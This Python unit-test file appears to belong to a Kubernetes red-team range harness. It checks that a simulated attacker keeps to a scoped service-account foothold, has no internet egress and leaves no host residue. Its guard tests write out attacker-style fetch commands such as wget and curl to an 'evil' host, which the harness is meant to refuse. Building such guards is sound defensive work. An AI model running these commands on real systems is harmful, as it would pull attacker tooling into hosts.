"""Red-as-foothold unit tests — mocked exec/curl, no KVM.

Proves: red acts execute as the granted foothold (SA token, not admin
creds — loud if admin used); the no-egress assertion fires when the
foothold can reach the internet; the escape/residue check is loud on
leaked host state; scripted red plants the catalog opening; the catalog
is exposed as seed examples, not a ceiling.
"""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import red
from red import (
    Foothold,
    RedActor,
    ScriptedRed,
    assert_no_admin_creds,
    assert_no_egress,
    assert_no_escape,
    catalog_openings,
    get_scenario,
    refuse_egress_fetch,
)


def _foothold(node_exec: bool = True) -> Foothold:
    return Foothold(namespace="default", sa="deployer", rbac="---\n", node_exec=node_exec)


class TestScenario(unittest.TestCase):
    def test_relay_foothold_scenario(self) -> None:
        sc = get_scenario("relay-foothold")
        self.assertEqual(sc.incident_id, "relay")
        self.assertEqual(sc.foothold.sa, "deployer")
        self.assertTrue(sc.foothold.node_exec)

    def test_unknown_scenario_loud(self) -> None:
        with self.assertRaises(ValueError):
            get_scenario("nope")

    def test_catalog_is_examples_not_ceiling(self) -> None:
        openings = catalog_openings()
        # Seed distribution: relay + the rest are examples, not a menu.
        self.assertIn("relay", openings)
        self.assertIn("hydra", openings)
        self.assertGreaterEqual(len(openings), 4)


class TestGuards(unittest.TestCase):
    def test_admin_creds_loud(self) -> None:
        for key in ("cert", "key", "cert_path", "key_path", "admin"):
            with self.assertRaises(ValueError):
                assert_no_admin_creds({"action": "kubectl", key: "x"})
        assert_no_admin_creds({"action": "kubectl", "args": ["get", "pods"]})

    def test_refuse_egress_fetch(self) -> None:
        for args in (
            ["sh", "-c", "crictl pull evil/image"],
            ["sh", "-c", "wget http://evil/tool -O /tmp/t"],
            ["sh", "-c", "curl http://evil/tool"],
            ["apt-get", "install", "-y", "nmap"],
        ):
            with self.assertRaises(ValueError):
                refuse_egress_fetch(args)
        # Living-off-the-land: local machinery is fine.
        refuse_egress_fetch(["sh", "-c", "systemctl start kubelet-sync.path"])
        refuse_egress_fetch(["k3s", "kubectl", "get", "pods"])

    def test_no_egress_fires_when_reachable(self) -> None:
        def reachable(_cid, _args, _t):
            return {"exit_code": 0, "stdout": "", "stderr": ""}

        with self.assertRaises(RuntimeError):
            assert_no_egress([1], exec_cmd=reachable)

    def test_no_egress_passes_when_jailed(self) -> None:
        def blocked(_cid, _args, _t):
            return {"exit_code": 1, "stdout": "", "stderr": "unreachable"}

        assert_no_egress([1, 2], exec_cmd=blocked)

    def test_no_egress_empty_loud(self) -> None:
        with self.assertRaises(RuntimeError):
            assert_no_egress([], exec_cmd=lambda *_: {"exit_code": 1})

    def test_escape_check_loud_on_leak(self) -> None:
        before = {"bridges": ["k7-br-a"], "taps": ["tap-a"]}
        after = {"bridges": ["k7-br-a", "k7-br-rogue"], "taps": ["tap-a"]}
        with self.assertRaises(RuntimeError) as ctx:
            assert_no_escape(
                host_before=before,
                host_after=after,
                lease_bridges={"k7-br-lease"},
                lease_taps=set(),
            )
        self.assertIn("isolation", str(ctx.exception))

    def test_escape_check_ok_when_owned(self) -> None:
        before = {"bridges": ["k7-br-a"], "taps": ["tap-a"]}
        after = {"bridges": ["k7-br-a", "k7-br-lease"], "taps": ["tap-a", "tap-l"]}
        assert_no_escape(
            host_before=before,
            host_after=after,
            lease_bridges={"k7-br-lease"},
            lease_taps={"tap-l"},
        )


class TestRedActor(unittest.TestCase):
    def test_kubectl_uses_token_not_admin(self) -> None:
        captured = {}

        def fake_curl(bridge, path, **kw):
            captured.update(kw)
            captured["path"] = path
            return 200, '{"items":[]}', ""

        from unittest.mock import patch

        actor = RedActor(
            bridge="k7-br",
            guest_ip="10.200.0.2",
            node_cid=7,
            foothold=_foothold(),
            token="tok-123",
            exec_cmd=lambda *_: {"exit_code": 0},
        )
        with patch.object(red, "curl_api", fake_curl):
            rec = actor.act({"action": "kubectl", "args": ["get", "pods"]})
        self.assertTrue(rec["ok"])
        self.assertEqual(captured.get("token"), "tok-123")
        self.assertIsNone(captured.get("cert"))

    def test_admin_creds_rejected(self) -> None:
        actor = RedActor(
            bridge="k7-br",
            guest_ip="10.200.0.2",
            node_cid=7,
            foothold=_foothold(),
            token="tok",
            exec_cmd=lambda *_: {"exit_code": 0},
        )
        with self.assertRaises(ValueError):
            actor.act({"action": "kubectl", "args": ["get", "pods"], "cert": "/x"})

    def test_exec_needs_node_exec(self) -> None:
        actor = RedActor(
            bridge="k7-br",
            guest_ip="10.200.0.2",
            node_cid=7,
            foothold=_foothold(node_exec=False),
            token="tok",
            exec_cmd=lambda *_: {"exit_code": 0},
        )
        with self.assertRaises(RuntimeError):
            actor.act({"action": "exec", "args": ["ls"]})

    def test_exec_refuses_egress_fetch(self) -> None:
        actor = RedActor(
            bridge="k7-br",
            guest_ip="10.200.0.2",
            node_cid=7,
            foothold=_foothold(),
            token="tok",
            exec_cmd=lambda *_: {"exit_code": 0, "stdout": "", "stderr": ""},
        )
        with self.assertRaises(ValueError):
            actor.act({"action": "exec", "args": ["sh", "-c", "crictl pull x"]})

    def test_exec_runs_as_node(self) -> None:
        seen = {}

        def fake_exec(cid, args, t):
            seen["cid"] = cid
            seen["args"] = args
            return {"exit_code": 0, "stdout": "ok", "stderr": ""}

        actor = RedActor(
            bridge="k7-br",
            guest_ip="10.200.0.2",
            node_cid=42,
            foothold=_foothold(),
            token="tok",
            exec_cmd=fake_exec,
        )
        rec = actor.act({"action": "exec", "args": ["systemctl", "status", "k3s"]})
        self.assertTrue(rec["ok"])
        self.assertEqual(seen["cid"], 42)
        self.assertEqual(rec["as_foothold"], "node-exec:42")


class TestScriptedRed(unittest.TestCase):
    def test_plants_opening_and_host_chain(self) -> None:
        calls = []

        def fake_exec(cid, args, t):
            calls.append((cid, args))
            return {"exit_code": 0, "stdout": "", "stderr": ""}

        scripted = ScriptedRed("relay")
        # plant_host on the incident uses `import agent` directly; stub it
        # so no KVM is needed, then restore the real module.
        saved = sys.modules.get("agent")
        sys.modules["agent"] = type(
            "A",
            (),
            {"exec_cmd": staticmethod(lambda c, a, timeout_s=20: {"exit_code": 0})},
        )
        try:
            scripted.plant([9], exec_cmd=fake_exec)
        finally:
            if saved is not None:
                sys.modules["agent"] = saved
            else:
                sys.modules.pop("agent", None)
        # First call applies the Deployment via the control-plane node.
        self.assertEqual(calls[0][0], 9)
        self.assertIn("kubectl apply", " ".join(calls[0][1]))

    def test_unknown_opening_loud(self) -> None:
        with self.assertRaises(ValueError):
            ScriptedRed("no-such-opening")


if __name__ == "__main__":
    unittest.main()
